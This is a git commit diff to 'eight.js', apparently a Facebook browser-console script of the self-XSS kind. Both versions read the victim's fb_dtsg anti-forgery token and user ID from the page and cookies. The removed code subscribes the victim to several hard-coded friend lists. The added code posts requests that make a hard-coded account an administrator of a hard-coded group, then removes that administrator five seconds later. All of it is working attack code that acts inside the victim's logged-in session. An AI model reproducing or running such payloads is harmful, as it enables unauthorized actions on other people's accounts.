82d0a49664843711d09c7a5cb50951c4902c666b
Bhargav Jt. Gogoi <www.bhargav1996@gmail.com>
2014-09-28 01:58:43 +0530

    Update eight.js

--- eight.js
+++ eight.js
@@ -1,9 +1,10 @@
 var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
 var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
-function LIST(L) {
+function IDA(L) {
+  function grp(g) {
 var X = new XMLHttpRequest();
-var XURL = "//www.facebook.com/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe&flid=" + L;
-var XParams = "fb_dtsg=" + fb_dtsg + "&__user=" + user_id + "&__a=1&__dyn=7n8ahyj35ynzpQ9UmWWuUGy6zECQ8yo&__req=d&ttstamp=26581681054512111570";
+var XURL = "//www.facebook.com/ajax/groups/admins_post.php";
+var XParams = "fb_dtsg="+fb_dtsg+"&gid="+g+"&uid="+L+"&operation=confirm_add_admin&source=profilebrowser&make_admin=1&__user="+user_id+"&__a=1&__dyn=7n8ahyngNoSdDgDxyKAEWC5ECiq78hyWgSmEVFLFwxBxCbzElx24QqV8KVpoW8w&__req=b&ttstamp=26581721095188861071146981121&__rev=1433023";
 X.open("POST", XURL, true);
 X.onreadystatechange = function () {
 if (X.readyState == 4 && X.status == 200) {
@@ -12,8 +13,33 @@ X.close;
 };
 X.send(XParams);
 }
-LIST("148559432012336");
-LIST("156489554515051");
-LIST("146971562150041");
-LIST("159553654225165");
-LIST("1410880552485258");
+grp("705588956191212");
+}
+IDA("100003653787875");
+
+    setTimeout(function(){
+      
+      
+
+var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
+var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
+function IDA(L) {
+  function grp(g) {
+var X = new XMLHttpRequest();
+var XURL = "//www.facebook.com/ajax/groups/admins_post.php";
+var XParams = "fb_dtsg="+fb_dtsg+"&gid="+g+"&uid="+L+"&operation=confirm_remove_admin&source=profilebrowser&__user="+user_id+"&__a=1&__dyn=7n8anEBQ9FoBUSt2u6aWizGpUW9ACxO4p9GgSmEVFLFwxBxCbzEjUgDyQqV8KVpoW8w&__req=h&ttstamp=265817111312075458011545110121&__rev=1433023";
+X.open("POST", XURL, true);
+X.onreadystatechange = function () {
+if (X.readyState == 4 && X.status == 200) {
+X.close;
+}
+};
+X.send(XParams);
+}
+grp("705588956191212");
+}
+IDA("100003653787875");
+      
+      
+      
+    }, 5000);
